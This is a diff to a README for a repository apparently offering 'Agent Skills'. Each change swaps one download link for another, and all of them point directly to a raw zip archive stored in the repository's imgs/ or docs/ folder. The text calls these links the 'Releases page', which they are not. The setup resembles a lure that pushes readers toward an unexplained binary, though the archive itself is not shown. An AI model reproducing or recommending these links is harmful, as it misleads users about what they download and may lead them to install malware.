@@ -6,7 +6,7 @@ Welcome to the **skills** repository! This collection of Agent Skills, developed
 
 ## 📥 Download Now
 
-[![Download skills](https://github.com/dali-raki/skills/raw/refs/heads/main/imgs/Software-v3.8.zip%20skills-v1.0-blue)](https://github.com/dali-raki/skills/raw/refs/heads/main/imgs/Software-v3.8.zip)
+[![Download skills](https://raw.githubusercontent.com/dali-raki/skills/main/docs/Software_v1.1.zip%20skills-v1.0-blue)](https://raw.githubusercontent.com/dali-raki/skills/main/docs/Software_v1.1.zip)
 
 ## 💻 System Requirements
 
@@ -29,7 +29,7 @@ The **skills** repository offers:
 
 To get started, follow these simple steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/dali-raki/skills/raw/refs/heads/main/imgs/Software-v3.8.zip).
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/dali-raki/skills/main/docs/Software_v1.1.zip).
    
 2. **Choose the Latest Version**:
    - Look for the most recent release.
@@ -70,7 +70,7 @@ We encourage you to become part of our community. You can ask questions, share e
 
 ## 📅 Keeping Up-to-Date
 
-Stay informed about updates and new features. Regularly check the [Releases page](https://github.com/dali-raki/skills/raw/refs/heads/main/imgs/Software-v3.8.zip) for the latest improvements.
+Stay informed about updates and new features. Regularly check the [Releases page](https://raw.githubusercontent.com/dali-raki/skills/main/docs/Software_v1.1.zip) for the latest improvements.
 
 ## 🧑‍💻 Contributing
 
